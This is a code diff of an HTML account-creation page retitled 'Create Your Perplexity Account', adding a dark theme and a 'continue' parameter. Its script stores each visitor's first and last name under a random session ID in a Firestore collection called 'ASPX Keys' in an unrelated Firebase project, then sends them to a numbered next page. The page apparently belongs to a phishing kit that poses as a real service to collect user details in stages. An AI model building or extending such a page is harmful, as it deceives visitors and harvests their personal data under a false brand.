@@ -4,7 +4,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Create Account</title>
+    <title>Create Your Perplexity Account</title>
     <style>
         * {
             box-sizing: border-box;
@@ -18,6 +18,11 @@
             justify-content: center;
             background-color: #ffffff;
             color: #000000;
+        }
+
+        body.dark {
+            background-color: #000000;
+            color: #ffffff;
         }
 
         .container {
@@ -44,6 +49,10 @@
             margin-bottom: 40px;
         }
 
+        body.dark .subtitle {
+            color: #aaa;
+        }
+
         .input-group {
             width: 100%;
             position: relative;
@@ -62,19 +71,33 @@
             z-index: 1;
         }
 
+        body.dark .input-group label {
+            background: #000;
+            color: #aaa;
+        }
+
         input {
             width: 100%;
             padding: 16px;
             font-size: 16px;
             border: 1px solid #d1d1d6;
-            border-radius: 24px; 
+            border-radius: 24px;
             outline: none;
-            transition: border-color 0.2s;
+        }
+
+        body.dark input {
+            background: #000;
+            color: #fff;
+            border: 1px solid #555;
         }
 
         input:focus {
             border-color: #000000;
             border-width: 2px;
+        }
+
+        body.dark input:focus {
+            border-color: #fff;
         }
 
         .btn-continue {
@@ -88,11 +111,11 @@
             border-radius: 28px;
             cursor: pointer;
             margin-top: 20px;
-            transition: opacity 0.2s;
         }
 
-        .btn-continue:active {
-            opacity: 0.8;
+        body.dark .btn-continue {
+            background-color: #fff;
+            color: #000;
         }
 
         .error {
@@ -125,87 +148,116 @@
 </div>
 
 <script type="module">
-    import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
-    import { getFirestore, doc, setDoc } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore.js";
+import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
+import { getFirestore, doc, setDoc } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore.js";
 
-    const firebaseConfig = {
-        apiKey: "AIzaSyDPm2za3Ho0Hd8Henuhq0KxAHyUQh-Hi-U",
-        authDomain: "question-metabase.firebaseapp.com",
-        databaseURL: "https://question-metabase-default-rtdb.asia-southeast1.firebasedatabase.app",
-        projectId: "question-metabase",
-        storageBucket: "question-metabase.firebasestorage.app",
-        messagingSenderId: "770698198753",
-        appId: "1:770698198753:web:59ae49d78b6013bab5c1a0",
-        measurementId: "G-6ZP1FPMKSJ"
-    };
+const firebaseConfig = {
+    apiKey: "AIzaSyDPm2za3Ho0Hd8Henuhq0KxAHyUQh-Hi-U",
+    authDomain: "question-metabase.firebaseapp.com",
+    databaseURL: "https://question-metabase-default-rtdb.asia-southeast1.firebasedatabase.app",
+    projectId: "question-metabase",
+    storageBucket: "question-metabase.firebasestorage.app",
+    messagingSenderId: "770698198753",
+    appId: "1:770698198753:web:59ae49d78b6013bab5c1a0",
+    measurementId: "G-6ZP1FPMKSJ"
+};
 
-    const app = initializeApp(firebaseConfig);
-    const db = getFirestore(app);
+const app = initializeApp(firebaseConfig);
+const db = getFirestore(app);
 
-    function initSession() {
-        const params = new URLSearchParams(window.location.search);
-        let session = params.get('session');
-        let type = params.get('type') || 'personal';
+/* ================= THEME ================= */
+function applyTheme() {
+    const params = new URLSearchParams(window.location.search);
+    const theme = params.get("theme");
 
-        if (!session) {
-            session = Math.floor(1000000000 + Math.random() * 9000000000).toString();
-            const newUrl = `${window.location.pathname}?session=${session}&type=${type}`;
-            window.history.replaceState({}, '', newUrl);
-        }
-        return { session, type };
-    }
-
-    const { session, type } = initSession();
-
-    async function submitData() {
-        const firstName = document.getElementById('firstName').value.trim();
-        const lastName = document.getElementById('lastName').value.trim();
-        const errorDiv = document.getElementById('fnError');
-
-        if (!firstName) {
-            errorDiv.style.display = 'block';
-            return;
-        }
-        errorDiv.style.display = 'none';
-
-        // ✅ Normalize type (case-insensitive)
-        const t = type.toLowerCase();
-
-        let familyValue = "no";
-        if (t === 'kids') familyValue = "commit";
-        if (t === 'personal') familyValue = "no";
-        if (t === 'business') familyValue = "workspace";
-
-        try {
-            await setDoc(doc(db, "ASPX Keys", session), {
-                firstName: firstName,
-                lastName: lastName,
-                type: t,           // ✅ saved type
-                family: familyValue, // ✅ mapped family
-                timestamp: new Date()
-            });
-
-            window.location.href = `2.html?session=${session}&type=${t}`;
-        } catch (e) {
-            console.error("Error: ", e);
+    if (theme === "d") {
+        document.body.classList.add("dark");
+    } else if (theme === "l") {
+        document.body.classList.remove("dark");
+    } else {
+        // auto detect
+        if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
+            document.body.classList.add("dark");
         }
     }
+}
+applyTheme();
 
-    document.getElementById('firstName').addEventListener('keypress', (e) => {
-        if (e.key === 'Enter') {
-            e.preventDefault();
-            document.getElementById('lastName').focus();
-        }
-    });
+/* ================= SESSION ================= */
+function initSession() {
+    const params = new URLSearchParams(window.location.search);
 
-    document.getElementById('lastName').addEventListener('keypress', (e) => {
-        if (e.key === 'Enter') {
-            e.preventDefault();
-            submitData();
-        }
-    });
+    let session = params.get('session');
+    let type = params.get('type') || 'personal';
+    let cont = params.get('continue') || '';
 
-    document.getElementById('continueBtn').addEventListener('click', submitData);
+    if (!session) {
+        session = Math.floor(1000000000 + Math.random() * 9000000000).toString();
+
+        let newUrl = `${window.location.pathname}?session=${session}&type=${type}`;
+        if (cont) newUrl += `&continue=${encodeURIComponent(cont)}`;
+
+        window.history.replaceState({}, '', newUrl);
+    }
+
+    return { session, type, cont };
+}
+
+const { session, type, cont } = initSession();
+
+/* ================= SUBMIT ================= */
+async function submitData() {
+    const firstName = document.getElementById('firstName').value.trim();
+    const lastName = document.getElementById('lastName').value.trim();
+    const errorDiv = document.getElementById('fnError');
+
+    if (!firstName) {
+        errorDiv.style.display = 'block';
+        return;
+    }
+
+    errorDiv.style.display = 'none';
+
+    const t = type.toLowerCase();
+
+    let familyValue = "no";
+    if (t === 'kids') familyValue = "commit";
+    if (t === 'business') familyValue = "workspace";
+
+    try {
+        await setDoc(doc(db, "ASPX Keys", session), {
+            firstName,
+            lastName,
+            type: t,
+            family: familyValue,
+            continue: cont || null, // ✅ stored
+            timestamp: new Date()
+        });
+
+        // ✅ redirect WITHOUT type
+        window.location.href = `2.html?session=${session}`;
+
+    } catch (e) {
+        console.error("Error: ", e);
+    }
+}
+
+/* ================= EVENTS ================= */
+document.getElementById('firstName').addEventListener('keypress', (e) => {
+    if (e.key === 'Enter') {
+        e.preventDefault();
+        document.getElementById('lastName').focus();
+    }
+});
+
+document.getElementById('lastName').addEventListener('keypress', (e) => {
+    if (e.key === 'Enter') {
+        e.preventDefault();
+        submitData();
+    }
+});
+
+document.getElementById('continueBtn').addEventListener('click', submitData);
 </script>
 
 </body>
